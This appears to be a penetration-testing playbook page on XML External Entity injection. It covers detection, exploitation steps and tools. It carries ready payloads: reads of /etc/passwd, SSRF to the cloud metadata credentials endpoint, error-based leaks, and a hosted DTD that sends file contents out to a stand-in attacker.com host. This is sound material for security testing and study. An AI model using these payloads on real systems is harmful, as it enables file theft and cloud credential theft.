# XXE Injection (XML External Entity)

## Overview
XML External Entity (XXE) injection occurs when an application parses XML input that contains references to external entities. If the XML parser is misconfigured (external entity processing enabled), an attacker can read local files, perform SSRF, exfiltrate data out-of-band, or in some cases achieve remote code execution.

## When This Happens

You are likely facing XXE when:

- The application accepts XML input (file uploads, API requests, SOAP endpoints, RSS feeds, SVG uploads, SAML authentication, Office document processing).
- The `Content-Type` header is `application/xml`, `text/xml`, or `application/soap+xml`.
- You can switch a JSON API to XML and it still processes the request.
- The application reflects parts of your XML input in the response (enabling classic XXE).

## Recon / Detection

### 1. Identify XML processing endpoints
- Look for XML-based APIs, SOAP services, file upload features that accept XML/SVG/DOCX.
- Check APIs that accept JSON — try switching `Content-Type` to `application/xml` and send equivalent XML.
- Look for SAML SSO endpoints (SAML assertions are XML).

### 2. Test for entity processing
Send a simple entity definition to see if the parser resolves it:

```xml
<!DOCTYPE test [
  <!ENTITY xxe "entity_resolved">
]>
<root>&xxe;</root>
```

If the response contains `entity_resolved`, the parser processes entities.

### 3. Test for external entity loading
```xml
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "http://your-collaborator.com/xxe-test">
]>
<root>&xxe;</root>
```

Check your collaborator/callback server for an incoming request.

## Exploitation Steps

### Classic XXE — Local file read

Define an external entity pointing to a local file, then reference it in a field that gets reflected in the response:

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```

On Windows:
```xml
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
```

**Key insight**: You need an **injection point** (a tag whose value is reflected back) and a **reflective response** (the server includes that value in its output). For example, if the server says `"Processing version: [VERSION]"`, inject the entity into the `<Version>` field.

### XXE via SSRF

Use XXE to make the server issue requests to internal services:

```xml
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

This can access cloud metadata endpoints (AWS, GCP, Azure) or internal APIs.

### Blind XXE — Out-of-Band (OOB) exfiltration

When the server does not reflect entity values in the response, use parameter entities to exfiltrate data to an external server:

**Malicious DTD hosted on attacker server (`evil.dtd`):**
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

**Payload sent to target:**
```xml
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>test</root>
```

The server fetches `evil.dtd`, resolves `%file;` (reading `/etc/hostname`), then sends the file content to `attacker.com` as a query parameter.

### Blind XXE — Error-based exfiltration

Trigger a parsing error that includes file content in the error message:

```xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

The error message may contain the contents of `/etc/passwd`.

### XXE via file upload

**SVG:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```

**DOCX/XLSX**: Unzip the Office file, inject XXE into internal XML files (e.g., `[Content_Types].xml`), rezip, and upload.

### Encoding bypass

Some parsers reject payloads when the XML declaration specifies an encoding that conflicts with the entity content. **Removing the XML declaration line** (`<?xml version="1.0" encoding="UTF-8"?>`) can bypass this check, forcing the parser to accept the raw content without encoding validation.

## Example Payloads

```xml
<!-- Basic file read -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

<!-- SSRF to cloud metadata -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root>&xxe;</root>

<!-- PHP filter for base64 output (avoids XML parsing issues) -->
<!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root>&xxe;</root>

<!-- XXE in firmware update XML (from CTF) -->
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<FirmwareUpdateConfig>
    <Firmware>
        <Version>&xxe;</Version>
        <ReleaseDate>2077-10-21</ReleaseDate>
    </Firmware>
</FirmwareUpdateConfig>
```

## Tools

- **Burp Suite**: Intercept XML requests, test entity injection in Repeater.
- **XXEinjector**: Automated XXE exploitation (classic + OOB).
- **Collaborator / RequestRepo**: Detect blind XXE callbacks.
- **DTD hosting**: Simple HTTP server to host malicious DTD files for OOB exfiltration.

## Real-World Notes

- Always check if you can **switch JSON APIs to XML** — many frameworks silently support both content types, and the XML parser may be misconfigured.
- SVG upload is a frequently overlooked XXE vector, especially in image processing pipelines (avatar uploads, document converters, PDF generators).
- In CTF challenges and real applications, the **reflection point** is critical — find which XML tag's value appears in the response, and inject your entity reference there.
- If the `<?xml ... encoding="...">` declaration causes issues, try removing it entirely to bypass encoding checks.
- Cloud metadata SSRF via XXE is a high-severity finding in cloud-hosted applications.

## References

- `techniques/server-side-template-injection.md`
- `scenarios/ssrf-via-xmlrpc-pingback-workflow.md`
- `methodology/web-recon-methodology.md`
- `tools/recon-tools.md`
